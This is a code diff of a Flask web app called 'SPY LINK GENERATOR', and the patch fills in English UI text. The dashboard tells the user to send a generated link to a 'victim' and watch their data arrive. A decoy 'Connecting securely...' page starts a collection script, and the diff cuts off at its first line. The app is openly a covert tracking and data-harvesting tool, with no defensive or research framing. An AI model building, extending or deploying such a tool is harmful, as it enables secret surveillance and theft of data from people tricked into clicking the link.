@@ -8,7 +8,6 @@ from flask import Flask, request, render_template_string, redirect
 app = Flask(__name__)
 reports = {}
 
-#  HTML
 DASHBOARD = """
 <!DOCTYPE html>
 <html>
@@ -25,16 +24,16 @@ pre{background:#000;padding:10px;border-radius:10px;overflow-x:auto;}
 </head>
 <body>
 <div class="card">
-<h2> SPY LINK GENERATOR</h2>
-<p>           </p>
+<h2>SPY LINK GENERATOR</h2>
+<p>Generate link and send to victim. When they click, all data will appear below.</p>
 <div class="input-group">
 <input type="text" id="link" value="{{ link }}" readonly>
-<button onclick="copyLink()"></button>
+<button onclick="copyLink()">Copy Link</button>
 </div>
 </div>
 <div class="card">
-<h3>   (UID: {{ uid }})</h3>
-<button onclick="location.reload()" style="margin-bottom:10px;"> </button>
+<h3>Received Data (UID: {{ uid }})</h3>
+<button onclick="location.reload()" style="margin-bottom:10px;">Refresh</button>
 <div id="reports">
 {% if reports[uid] and reports[uid].data %}
     {% for item in reports[uid].data|reverse %}
@@ -44,12 +43,12 @@ pre{background:#000;padding:10px;border-radius:10px;overflow-x:auto;}
         </div>
     {% endfor %}
 {% else %}
-    <p>       </p>
+    <p>No data received yet. Send the link to victim.</p>
 {% endif %}
 </div>
 </div>
 <script>
-function copyLink(){ const i=document.getElementById('link'); i.select(); navigator.clipboard.writeText(i.value); alert('!'); }
+function copyLink(){ const i=document.getElementById('link'); i.select(); navigator.clipboard.writeText(i.value); alert('Copied!'); }
 setInterval(()=>location.reload(), 8000);
 </script>
 </body>
@@ -60,8 +59,8 @@ SPY_PAGE = """
 <!DOCTYPE html>
 <html><head><meta charset="UTF-8"><title>Loading...</title><style>body{background:#000;color:#0f0;text-align:center;padding-top:20%;font-family:monospace;}</style></head>
 <body>
-<h2>  ...</h2>
-<p>   </p>
+<h2>Connecting securely...</h2>
+<p>Please wait</p>
 <script>
 (async function(){
     const server = "{{ server }}";
